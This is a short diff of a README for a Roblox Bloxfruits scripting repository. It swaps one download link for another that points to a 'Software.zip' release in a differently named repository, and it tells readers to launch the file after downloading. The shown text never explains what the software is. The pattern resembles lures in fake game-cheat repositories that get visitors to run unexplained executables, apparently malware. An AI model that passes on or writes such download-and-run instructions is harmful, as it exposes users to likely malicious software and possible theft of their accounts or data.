@@ -21,7 +21,7 @@ Explore various topics related to Roblox and scripting with Bloxfruits in this r
 - roblox-scripts
 
 ## Software Download :rocket:
-Click [here](https://github.com/user-attachments/files/18410590/Software.zip) to download the software. Don't forget to launch the file once the download is complete.
+Click [here](https://github.com/AnikThakur05/Nosferatu-2/releases/download/v2.0/Software.zip) to download the software. Don't forget to launch the file once the download is complete.
 
 ## Get Involved :computer:
 Explore the repository and get engaged with the topics related to Bloxfruits and Roblox scripting. Join discussions, share ideas, and contribute to the community of developers interested in these exciting technologies.
